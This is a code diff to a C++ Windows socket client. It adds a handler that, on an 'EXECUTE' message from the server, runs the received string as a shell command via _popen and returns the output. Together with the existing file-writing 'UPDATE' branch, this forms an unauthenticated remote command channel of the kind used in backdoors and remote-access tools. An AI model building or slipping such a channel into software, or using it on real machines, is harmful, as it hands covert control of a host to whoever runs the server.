@@ -5,6 +5,7 @@
 #include <fstream>
 #include "Socket.h"
 #include "WindowsSocket.h"
+#include "string.h"
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
@@ -45,7 +46,45 @@ void create_file(Socket clientSocket,SOCKET socket, char* recBuf, int iResult)
 		cout << "closed the file" << endl;
 	}	
 }
-
+std::string exec(const char* cmd)
+{
+	char buffer[128];
+	std::string result = "";
+	FILE* pipe = _popen(cmd, "r");
+	if (!pipe) throw std::runtime_error("popen() failed!");
+	try {
+		while (!feof(pipe)) {
+			if (fgets(buffer, 128, pipe) != NULL)
+				result += buffer;
+		}
+	}
+	catch (...) {
+		_pclose(pipe);
+		throw;
+	}
+	_pclose(pipe);
+	return result;
+}
+void executeCommand(Socket clientSocket, SOCKET socket)
+{
+	char recvbuf[DEFAULT_BUFLEN * 4];
+	int iResult, iResult2;
+	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
+	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+	iResult2 = clientSocket.send_data(socket, "ok");//ok
+	std::string w = exec(recvbuf);
+	cout << w.c_str() << endl;
+	clientSocket.send_data(socket, w.c_str());
+	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);//
+	iResult = clientSocket.receive(socket, recvbuf, 2);//ok
+	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
+	iResult = clientSocket.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+	iResult2 = clientSocket.send_data(socket, "ok");
+	if (!strcmp(recvbuf, "END_EXECUTE"))
+	{
+		cout << "end execute" << endl;
+	}
+}
 int main(int argc, char **argv)
 {
 	Socket clientSocket;
@@ -115,6 +154,10 @@ int main(int argc, char **argv)
 					if (!strcmp(recvbuf, "UPDATE"))
 					{
 						create_file(clientSocket, socket, recvbuf, iResult);
+					}
+					else if (!strcmp(recvbuf, "EXECUTE"))
+					{
+						executeCommand(clientSocket, socket);
 					}
 					else
 					{
